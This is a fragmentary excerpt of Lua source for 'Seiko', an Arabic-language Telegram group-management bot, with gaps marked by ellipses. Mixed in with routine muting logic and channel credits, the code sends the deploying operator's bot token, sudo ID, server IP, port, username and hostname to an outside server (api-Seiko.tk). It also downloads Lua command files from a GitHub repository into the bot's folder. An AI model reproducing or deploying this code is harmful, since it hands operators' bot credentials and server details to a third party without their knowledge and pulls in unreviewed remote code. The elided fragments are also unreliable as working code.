...
data,res = https.request("https://api-Seiko.tk/api-s00f4/Seiko.php?bn=Seiko&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-Seiko.tk/api-s00f4/Seiko.php?n=Seiko&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-Seiko/Files_Seiko/main/File_Bot/commands.lua") 
...
-------------
if text == "🐉 حصريات و تحديثات سايـكو 🐉" and DevSoFi(msg) then  
local updatech =[[
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."Seiko:blocname"..msg.chat_id_) or ""
...
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."Seiko:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Seiko:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."Seiko:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."Seiko:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
...
℘ ⦑ SOURCE Seiko ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/llllrc)
℘︙ [Source Update ](t.me/llllrc)     
℘︙ [Source developer](t.me/s00f4)     
℘︙ [Seiko programmer](t.me/mndzr) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS Seiko](t.me/llllrcbot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-Seiko/Files_Seiko/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-Seiko/Files_Seiko/main/File_Bot/"..file)
if res == 200 then
...
local UserName = (b.username_ or "SRC-Seiko")
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.',url="t.me/llllrc"}},
}
local msg_id = msg.id_/2097152/0.5
